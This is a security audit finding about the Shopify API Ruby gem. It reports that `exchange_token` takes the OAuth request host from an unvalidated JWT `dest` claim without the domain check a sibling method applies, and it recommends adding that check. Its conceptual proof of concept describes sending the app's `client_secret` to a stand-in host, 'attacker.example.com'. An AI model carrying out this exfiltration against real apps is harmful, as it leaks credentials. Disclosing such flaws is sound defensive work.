### Title
Unvalidated JWT `dest` claim used as OAuth token-exchange request host, breaking the "shop == trusted myshopify domain" binding - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop used to route the `access_token` request (which carries the app's `client_id`/`client_secret`) directly from the JWT `dest` claim, with no domain-format validation, unlike the sibling method `migrate_to_expiring_token` which explicitly runs the shop through `Utils::ShopValidator.sanitize!`.

### Finding Description
`JwtPayload#shop` returns `@dest.gsub("https://", "")` with no format or trusted-domain check [2](#0-1) . `JwtPayload#initialize` only verifies the HS256 signature and that `aud == Context.api_key`; it never validates that `iss`/`dest` are well-formed `*.myshopify.com` (or other trusted) domains [3](#0-2) .

`exchange_token` takes this unvalidated value (`dest_shop = jwt_payload.shop`) and uses it to build `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)`, which is then passed to `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` to POST the token-exchange body containing `client_id` and `client_secret` [4](#0-3) . `HttpClient#initialize` builds the request host directly from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [1](#0-0) .

By contrast, `migrate_to_expiring_token` — which performs the same "send client_secret to a host derived from `shop`" operation — explicitly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session, restricting the host to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` [5](#0-4) [6](#0-5) . `exchange_token` has no equivalent check on `dest_shop`.

This mirrors the reported bug class: the equality the code must maintain is `host receiving client_secret == a domain covered by the trust boundary`. In `exchange_token`, the value acted on to select the destination host (`dest_shop`) is not checked against that trust boundary, while a nearly identical sibling method enforces it correctly.

### Impact Explanation
If `dest` can ever be non-`myshopify.com` (e.g., a malformed/attacker-influenced value reaching this code path, or a future change that loosens how session tokens are minted/relayed), the gem will POST the app's `client_id` and `client_secret` to an attacker-controlled host — an SSRF that exfiltrates the app's `client_secret`, which is Critical-severity per the rules (theft of the app's `client_secret`). Under normal operation the JWT is HS256-signed with `Context.api_secret_key`, so a completely external, credential-less attacker cannot forge `dest` outright; this limits current exploitability but the missing check is a real, demonstrable inconsistency against the codebase's own established mitigation pattern (`ShopValidator.sanitize!`) for the identical operation.

### Likelihood Explanation
Low-to-Moderate: exploitation in the strict "no credentials, no privileged access" model requires a way to get an application to call `exchange_token` with a `dest` value that isn't independently constrained (e.g., a session token relayed from a source other than genuine Shopify App Bridge, or any host-app logic that trusts the `dest`/`shop` value in ways not covered by this gem's documented contract). Given the OUT-OF-SCOPE rule excluding issues that "depend on the host application ignoring this gem's documented API," this is presented as a hardening gap rather than a fully self-contained exploit within this gem alone.

### Recommendation
Validate `dest_shop` through `Utils::ShopValidator.sanitize!` (or equivalent) in `exchange_token`, exactly as already done in `migrate_to_expiring_token`, before using it to construct the session/request host, so every code path that sends `client_id`/`client_secret` is uniformly bound to a trusted Shopify domain.

### Proof of Concept
Conceptual (cannot be fully demonstrated without the ability to mint a validly-signed JWT with a non-`myshopify.com` `dest`, since signing requires `Context.api_secret_key`):
1. Obtain/craft a session token whose payload has `aud == Context.api_key` and `dest == "https://attacker.example.com"`, signed with the app's `api_secret_key` (e.g., via a compromised relay or a host app that forwards attacker-controlled `dest` before minting/re-signing).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new(token)` accepts it (only `aud` is checked) [7](#0-6) .
4. `HttpClient` sends `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` [1](#0-0) , leaking the app's `client_secret` to the attacker's server.
